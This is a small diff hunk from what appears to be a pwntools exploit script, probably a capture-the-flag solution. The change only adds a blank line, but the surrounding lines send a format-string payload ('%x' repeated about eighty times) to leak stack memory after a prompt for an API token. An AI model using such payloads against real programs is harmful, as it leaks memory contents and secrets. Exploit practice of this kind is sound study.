@@ -15,6 +15,7 @@ r.recvuntil("What is your API token?\n")
 # send string to print stack
 r.send("%x" + "-%x"*80 + "\n")
 
+
 # receive until the line we want
 r.recvline()
 
